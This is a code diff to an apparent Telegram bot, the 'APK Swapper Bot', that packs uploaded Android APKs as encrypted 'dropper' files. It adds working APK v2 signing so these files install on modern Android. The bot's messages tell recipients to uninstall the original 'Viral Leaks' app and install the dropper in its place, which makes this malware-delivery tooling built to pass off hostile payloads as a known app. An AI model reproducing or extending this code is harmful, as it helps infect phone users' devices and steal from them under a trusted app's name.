@@ -2,7 +2,7 @@
 APK Swapper Bot — Full version with menu + auto-signing
 """
 
-import os, io, zipfile, secrets, logging, asyncio, hashlib, base64, datetime
+import os, io, zipfile, secrets, logging, asyncio, hashlib, base64, datetime, struct
 from pathlib import Path
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
@@ -98,6 +98,82 @@ def _build_sf(manifest: bytes, sections: list[tuple[str, bytes]]) -> bytes:
     return "".join(lines).encode()
 
 
+def _lp(data: bytes) -> bytes:
+    """uint32-LE length prefix + data (APK v2 block encoding)."""
+    return struct.pack('<I', len(data)) + data
+
+
+def _add_v2_signature(apk_bytes: bytes, key, cert) -> bytes:
+    """Insert APK Signature Scheme v2 signing block between file data and CD."""
+    from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.hazmat.primitives.asymmetric import padding as rsa_pad
+
+    EOCD_SIG   = 0x06054b50
+    MAGIC      = b"APK Sig Block 42"
+    ALGO_ID    = 0x0103          # RSASSA-PKCS1-v1_5 + SHA-256
+    CHUNK_SIZE = 1 << 20         # 1 MiB
+
+    n = len(apk_bytes)
+    eocd_off = -1
+    for i in range(n - 22, max(n - 22 - 65536, -1), -1):
+        if struct.unpack_from('<I', apk_bytes, i)[0] == EOCD_SIG:
+            eocd_off = i
+            break
+    if eocd_off < 0:
+        return apk_bytes
+
+    cd_offset = struct.unpack_from('<I', apk_bytes, eocd_off + 16)[0]
+
+    part1 = apk_bytes[:cd_offset]
+    part2 = apk_bytes[cd_offset:eocd_off]
+    # EOCD with CD_OFFSET zeroed — only used for digest, not output
+    eocd_zero = bytearray(apk_bytes[eocd_off:])
+    struct.pack_into('<I', eocd_zero, 16, 0)
+    part3 = bytes(eocd_zero)
+
+    def _chunk_digests(data: bytes) -> list[bytes]:
+        out = []
+        if not data:
+            out.append(hashlib.sha256(b'\xa5' + struct.pack('<I', 0)).digest())
+        else:
+            pos = 0
+            while pos < len(data):
+                chunk = data[pos:pos + CHUNK_SIZE]
+                pos += CHUNK_SIZE
+                out.append(hashlib.sha256(b'\xa5' + struct.pack('<I', len(chunk)) + chunk).digest())
+        return out
+
+    all_cd = _chunk_digests(part1) + _chunk_digests(part2) + _chunk_digests(part3)
+    top_digest = hashlib.sha256(
+        b'\x5a' + struct.pack('<I', len(all_cd)) + b''.join(all_cd)
+    ).digest()
+
+    cert_der    = cert.public_bytes(serialization.Encoding.DER)
+    pub_der     = key.public_key().public_bytes(
+        serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
+    )
+
+    # SignedData = digests_seq + certs_seq + attrs_seq
+    digest_entry = struct.pack('<I', ALGO_ID) + _lp(top_digest)
+    signed_data  = _lp(digest_entry) + _lp(_lp(cert_der)) + _lp(b'')
+
+    raw_sig = key.sign(signed_data, rsa_pad.PKCS1v15(), hashes.SHA256())
+
+    sig_entry = struct.pack('<I', ALGO_ID) + _lp(raw_sig)
+    signer    = _lp(signed_data) + _lp(sig_entry) + _lp(pub_der)
+    signers   = _lp(signer)
+
+    pair        = struct.pack('<Q', len(signers) + 4) + struct.pack('<I', 0x7109871a) + signers
+    block_size  = len(pair) + 8 + 16
+    sig_block   = struct.pack('<Q', block_size) + pair + struct.pack('<Q', block_size) + MAGIC
+
+    new_cd_off  = cd_offset + len(sig_block)
+    eocd_patched = bytearray(apk_bytes[eocd_off:])
+    struct.pack_into('<I', eocd_patched, 16, new_cd_off)
+
+    return part1 + sig_block + part2 + bytes(eocd_patched)
+
+
 def sign_apk(apk_bytes: bytes) -> tuple[bytes, bool]:
     try:
         from cryptography.hazmat.primitives import hashes, serialization
@@ -150,8 +226,17 @@ def sign_apk(apk_bytes: bytes) -> tuple[bytes, bool]:
             info.compress_type = zipfile.ZIP_STORED
             zout.writestr(info, mdata)
 
+    apk_v1 = out.getvalue()
     log.info("APK signed (v1/JAR, appended META-INF)")
-    return out.getvalue(), True
+
+    # Add APK Signature Scheme v2 block (required on Android 7.0+ for full compat)
+    try:
+        apk_v1v2 = _add_v2_signature(apk_v1, key, cert)
+        log.info("APK v2 signing block added (%d bytes)", len(apk_v1v2) - len(apk_v1))
+        return apk_v1v2, True
+    except Exception as e:
+        log.warning("v2 signing failed (%s) — returning v1-only", e)
+        return apk_v1, True
 
 # ─── State ────────────────────────────────────────────────────────────────────
 
@@ -365,7 +450,7 @@ async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await prog.edit_text(f"⚠️ Sign nahi hua: {e}\nUnsigned dropper bhej raha hoon...")
         signed = False
 
-    sign_note = "✅ Signed (debug key)" if signed else "⚠️ Unsigned — `pkg install openjdk-17` karo"
+    sign_note = "✅ v1+v2 (debug key)" if signed else "⚠️ Unsigned"
     out_name = f"dropper_{doc.file_name}"
     await prog.edit_text(f"📤 Bhej raha hoon ({len(new_dropper) // 1024} KB)...")
 
@@ -377,7 +462,11 @@ async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             f"📦 Payload: `{doc.file_name}`\n"
             f"📏 Size: `{len(new_dropper) // 1024} KB`\n"
             f"🔐 Key: `{AES_KEY_HEX[:24]}...`\n"
-            f"✍️ Signature: {sign_note}"
+            f"✍️ Signature: {sign_note}\n\n"
+            f"⚠️ *Install tip:*\n"
+            f"Agar 'package invalid' aaye → pehle original Viral Leaks\n"
+            f"uninstall karo (Settings → Apps → Viral Leaks → Uninstall)\n"
+            f"phir ye wala install karo."
         ),
         parse_mode="Markdown",
         reply_markup=InlineKeyboardMarkup([[
